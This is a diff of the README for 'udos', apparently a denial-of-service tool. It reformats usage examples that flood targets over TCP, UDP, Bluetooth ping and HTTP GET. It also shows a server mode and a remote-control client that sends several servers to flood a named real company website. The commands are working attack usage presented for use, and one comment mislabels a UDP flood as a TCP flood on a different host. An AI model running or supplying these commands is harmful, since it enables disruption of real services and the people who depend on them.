@@ -46,22 +46,21 @@ sudo python2.7 ./setup.py install
 Examples:
 ==============
 ```bash
-udos --target 1.1.1.1 --port 80 --socket tcp --bytes 256 # TCP flood 1.1.1.1:80 with 256 byte packets
-udos --target 2.2.2.2 --port 21 --socket udp --bytes 1024 # TCP flood 1.1.1.1:80 with 1024 byte packets
-udos --target 00:11:22:33:44  --socket rfc --bytes 668 # Bluetooth ping flood 00:11:22:33:44 with 668 byte packets
-udos --target http://localhost  --socket http --port 80  # HTTP GET flood on localhost, make many index.php requests as possible
+$ udos --target 2.2.2.2 --port 21 --socket udp --bytes 1024 # TCP flood 1.1.1.1:80 with 1024 byte packets
+$ udos --target 00:11:22:33:44  --socket rfc --bytes 668 # Bluetooth ping flood 00:11:22:33:44 with 668 byte packets
+$ udos --target http://localhost  --socket http --port 80  # HTTP GET flood on localhost, make many index.php requests as possible
 ```
 Server mode examples:
 ==============
 ```bash
-udos --server --debug # Run first server with verboose output, it will listen on all interfaces
-udos --server --debug # Run second server on other machine with ip eg. 8.8.8.2
+server1$ udos --server --debug # Run first server with verboose output, it will listen on all interfaces
+server2$ udos --server --debug # Run second server on other machine with ip eg. 8.8.8.2
 ```
 
 Server's remote controlling:
 ==============
 ```bash
-udos --client "192.168.0.100:8020, 8.8.8.2:8020" --run --target microsoft.com --port 80 --socket http  # set parameters and fire. Commands will be sent to two servers specified in --client
+client1$ udos --client "192.168.0.100:8020, 8.8.8.2:8020" --run --target microsoft.com --port 80 --socket http  # set parameters and fire. Commands will be sent to two servers specified in --client
 ```
 
 ```
